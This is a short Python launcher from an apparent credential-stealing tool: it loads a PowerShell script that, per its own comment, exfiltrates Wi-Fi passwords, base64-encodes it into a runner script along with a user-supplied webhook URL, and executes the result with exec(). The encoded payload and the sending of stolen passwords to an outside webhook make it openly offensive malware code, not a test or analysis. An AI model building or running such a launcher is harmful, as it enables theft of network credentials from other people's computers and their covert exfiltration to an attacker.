from pathlib import Path
from src.arg_parser import get_parsed_args
from src.modify_scripts import create_main_script


def main():
    args = get_parsed_args()
    
    # Read PowerShell script that exfiltrates Wi-Fi passwords
    ps_file = Path('src').joinpath('EXFIL.ps1')
    ps_script = ps_file.read_text('utf-8', 'replace')
    
    # Read Python script that runs PowerShell script
    py_file = Path('src').joinpath('run_ps.py')
    py_script = py_file.read_text('utf-8', 'replace')
    
    # Create main Python script with encoded (base64) PowerShell script
    py_main = create_main_script(py_script, ps_script, args.webhook)
    
    # Execute main Python script
    exec(py_main, globals(), globals())

if __name__ == '__main__':
    main()
